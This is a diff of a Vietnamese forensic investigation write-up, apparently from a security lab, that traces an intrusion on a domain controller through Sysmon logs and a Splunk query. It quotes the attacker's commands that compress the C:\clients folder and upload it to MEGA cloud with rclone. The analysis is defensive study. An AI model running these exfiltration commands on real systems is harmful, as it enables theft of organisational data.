@@ -575,7 +575,7 @@ Process tree:
 ![alt text](images/image-26.png)
 
 **Từ 2025-03-21 16:12:04 đến 2025-03-21 16:37:10:**
-- Attacker thành công copy sang và thực thi Pancake.jpg.exe trên DC01 dưới danh tính NT AUTHORITY\system, process Pancake.jpg.exe (4520) spawn ra các process con sau:
+- Attacker thành công copy sang và thực thi Pancake.jpg.exe trên DC01 dưới danh tính NT AUTHORITY\system, process Pancake.jpg.exe (4520) spawn ra các process con sau trong khoảng thời gian trên:
 
 | Timestamp | Lệnh | Giải thích |
 |---|---|---|
@@ -586,13 +586,11 @@ Process tree:
 
 **Từ 2025-03-21 16:37:57 đến 2025-03-21 16:45:19:**
 ![alt text](images/image-27.png)
-Attacker chuyển sang phiên RDP của user swhite trên DC01 (login ID = 0x107346c), sau đó vào 2025-03-21 16:37:57, hắn chạy rclone.exe vừa tải về trong Temp thông qua GUI (parent là explorer.exe), tuy nhiên, vì rclone là một công cụ commandline nên sau đó vào 2025-03-21 16:38:07 hắn khởi chạy chạy rclone (2025-03-21 16:38:09) qua cmd. Tiếp đó, vào 2025-03-21 16:38:15, hắn chạy lệnh ‘rclone config’ nhằm thiết lập và quản lý cấu hình kết nối giữa rclone và các dịch vụ lưu trữ. 
-
-Giả thuyết: attacker dùng credential của swhite để RDP vào DC01 thực thi rclone thay vì qua psexec vì rclone config là lệnh hỏi đáp từng bước và cần nhập input liên tục. Các lệnh trước đó được đẩy qua PsExec từ beacon bằng cmd /C nên không có stdin tương tác, và lệnh sẽ treo ở câu hỏi đầu tiên. Có thể đây là lí do chính attacker thực hiện truy cập vào DC01 qua RDP để chạy rclone config bằng tay. 
+Sau khi thành công tải về rclone, attacker chuyển sang phiên RDP của user swhite trên DC01 (login ID = 0x107346c), vào 2025-03-21 16:37:57, hắn chạy rclone.exe thông qua GUI (parent là explorer.exe), tuy nhiên, vì rclone là một công cụ commandline nên sau đó vào 2025-03-21 16:38:07 hắn khởi chạy rclone (2025-03-21 16:38:09) qua cmd, rồi chạy lệnh ‘rclone config’ nhằm nhập bằng tay cấu hình kết nối giữa rclone và các dịch vụ lưu trữ. 
 
 Vào 2025-03-21 16:41:15, attacker gửi lệnh: “powershell Compress-Archive -Path "C:\clients" -DestinationPath C:\Users\swhite\AppData\Local\Temp\rclone-v1.69.1-windows-amd64\data.zip" -Force” đến beacon Pancake.jpg.exe nhằm nén toàn bộ dữ liệu trong thư mục C:\clients rồi đẩy output ra tệp data.zip nằm trong thư mục của package rclone vừa tải. Sau đó vào  2025-03-21 16:42:18, hắn gửi lệnh “rclone copy data.zip mega:data” cho beacon Pancake.jpg.exe nhằm tuồn dữ liệu lên mega cloud.
 
-Tuy nhiên, từ 2025-03-21 16:42:40 đến 2025-03-21 16:43:29, attacker chuyển sang phiên RDP của swhite trên DC01 thực thi lệnh “rclone copy data.zip mega:data”, sau đó 47 giây, thực thi lại và thêm cờ --verbose: “rclone copy data.zip mega:data --verbose”. Các lệnh rclone copy data.zip mega:data được chạy lại ngay dưới swhite nhiều khả năng là do tệp cấu hình rclone.conf được tạo trong profile của swhite, còn process chạy qua psexec dùng profile SYSTEM chưa chạy ‘rclone config’ nên không thấy thông tin để truy cập trong tệp .conf ở user profile cho SYSTEM.
+Tuy nhiên, từ 2025-03-21 16:42:40 đến 2025-03-21 16:43:29, attacker chuyển sang phiên RDP của swhite trên DC01 thực thi lệnh “rclone copy data.zip mega:data”, sau đó 47 giây, thực thi lại và thêm cờ --verbose: “rclone copy data.zip mega:data --verbose”. Các lệnh rclone copy data.zip mega:data được chạy lại ngay dưới swhite nhiều khả năng là do tệp cấu hình rclone.conf được tạo trong profile của swhite, còn process chạy qua beacon dùng profile SYSTEM nhưng chưa chạy ‘rclone config’ nên không thấy thông tin để truy cập trong tệp .conf ở user profile cho SYSTEM.
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" earliest="03/21/2025:16:37:57" latest="03/21/2025:16:45:19" EventCode IN (3, 5, 22, 11) process_id IN (2244,2996,1660,4556) OR TargetFilename="*rclone.conf*"
